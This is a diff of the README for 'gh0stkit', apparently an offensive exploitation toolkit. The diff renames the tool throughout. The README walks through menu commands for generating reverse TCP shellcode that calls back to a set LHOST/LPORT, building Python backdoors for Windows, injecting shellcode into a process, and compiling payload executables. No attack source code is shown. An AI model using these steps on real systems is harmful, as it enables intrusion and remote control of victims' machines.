@@ -1,6 +1,6 @@
-# Gh0stKit - A Multi-Purpose Exploitation Toolkit
+# gh0stkit - A Multi-Purpose Exploitation Toolkit
 
-![Gh0st](https://i.pinimg.com/736x/51/5f/22/515f222302409b4fd1aebd6868c3e1ad.jpg)
+![gh0stkit](https://i.pinimg.com/736x/51/5f/22/515f222302409b4fd1aebd6868c3e1ad.jpg)
 
 
 
@@ -44,7 +44,7 @@ cd gh0stkit
 ### Run the tool:
 
 ```
-python gh0st.py 
+python gh0stkit.py 
 
 Alert: Donot run this tool with sudo or chmod.
 ```
@@ -53,7 +53,7 @@ Alert: Donot run this tool with sudo or chmod.
 - When you run the tool, you'll see the main menu:
 
 ```
-gh0st > 
+gh0stkit > 
 Available commands:
 
 help: Show the help menu.
@@ -83,11 +83,11 @@ exit: Exit the tool.
 #### **Example:**
 
 ```
-gh0st > use shellcode
-gh0st/shellcode > set LHOST 192.168.1.100
-gh0st/shellcode > set LPORT 4444
-gh0st/shellcode > set PLATFORM linux/x64
-gh0st/shellcode > generate
+gh0stkit > use shellcode
+gh0stkit/shellcode > set LHOST 192.168.1.100
+gh0stkit/shellcode > set LPORT 4444
+gh0stkit/shellcode > set PLATFORM linux/x64
+gh0stkit/shellcode > generate
 ```
 2. Backdoor Module
 - Create Python-based backdoors.
@@ -102,11 +102,11 @@ gh0st/shellcode > generate
 
 #### **Example:**
 ```
-gh0st > use backdoor
-gh0st/backdoor > set LHOST 192.168.1.100
-gh0st/backdoor > set LPORT 4444
-gh0st/backdoor > set PLATFORM python/windows
-gh0st/backdoor > generate
+gh0stkit > use backdoor
+gh0stkit/backdoor > set LHOST 192.168.1.100
+gh0stkit/backdoor > set LPORT 4444
+gh0stkit/backdoor > set PLATFORM python/windows
+gh0stkit/backdoor > generate
 ```
 3. Injector Module
 - Inject shellcode into a running process (Windows only).
@@ -117,8 +117,8 @@ gh0st/backdoor > generate
 
 #### **Example:**
 ```
-gh0st > use injector
-gh0st/injector > inject 1234
+gh0stkit > use injector
+gh0stkit/injector > inject 1234
 ```
 4. Encoder Module
 - Encode data using XOR, Base64, AES, or ROT13.
@@ -134,10 +134,10 @@ gh0st/injector > inject 1234
 #### **Example:**
 
 ```
-gh0st > use encoder
-gh0st/encoder > set ENCODING xor
-gh0st/encoder > set KEY secret
-gh0st/encoder > encode HelloWorld
+gh0stkit > use encoder
+gh0stkit/encoder > set ENCODING xor
+gh0stkit/encoder > set KEY secret
+gh0stkit/encoder > encode HelloWorld
 ```
 5. Executable Module
 - Compile shellcode into executables for Windows and Linux.
@@ -153,46 +153,46 @@ gh0st/encoder > encode HelloWorld
 #### **Example:**
 
 ```
-gh0st > use executable
-gh0st/executable > set PLATFORM windows
-gh0st/executable > set OUTPUT payload.exe
-gh0st/executable > generate
+gh0stkit > use executable
+gh0stkit/executable > set PLATFORM windows
+gh0stkit/executable > set OUTPUT payload.exe
+gh0stkit/executable > generate
 ```
 #### **Examples:**
 - Generate a Linux Reverse TCP Shellcode
 ```
-gh0st > use shellcode
-gh0st/shellcode > set LHOST 192.168.1.100
-gh0st/shellcode > set LPORT 4444
-gh0st/shellcode > set PLATFORM linux/x64
-gh0st/shellcode > generate
+gh0stkit > use shellcode
+gh0stkit/shellcode > set LHOST 192.168.1.100
+gh0stkit/shellcode > set LPORT 4444
+gh0stkit/shellcode > set PLATFORM linux/x64
+gh0stkit/shellcode > generate
 ```
 - Create a Python Backdoor for Windows
 ```
-gh0st > use backdoor
-gh0st/backdoor > set LHOST 192.168.1.100
-gh0st/backdoor > set LPORT 4444
-gh0st/backdoor > set PLATFORM python/windows
-gh0st/backdoor > generate
+gh0stkit > use backdoor
+gh0stkit/backdoor > set LHOST 192.168.1.100
+gh0stkit/backdoor > set LPORT 4444
+gh0stkit/backdoor > set PLATFORM python/windows
+gh0stkit/backdoor > generate
 ```
 - Inject Shellcode into a Process
 ```
-gh0st > use injector
-gh0st/injector > inject 1234
+gh0stkit > use injector
+gh0stkit/injector > inject 1234
 ```
 - Encode Data with XOR
 ```
-gh0st > use encoder
-gh0st/encoder > set ENCODING xor
-gh0st/encoder > set KEY secret
-gh0st/encoder > encode HelloWorld
+gh0stkit > use encoder
+gh0stkit/encoder > set ENCODING xor
+gh0stkit/encoder > set KEY secret
+gh0stkit/encoder > encode HelloWorld
 ```
 - Generate a Windows Executable
 ```
-gh0st > use executable
-gh0st/executable > set PLATFORM windows
-gh0st/executable > set OUTPUT payload.exe
-gh0st/executable > generate
+gh0stkit > use executable
+gh0stkit/executable > set PLATFORM windows
+gh0stkit/executable > set OUTPUT payload.exe
+gh0stkit/executable > generate
 ```
 ### Contributing
 Contributions are welcome! Please open an issue or submit a pull request for any improvements or bug fixes.
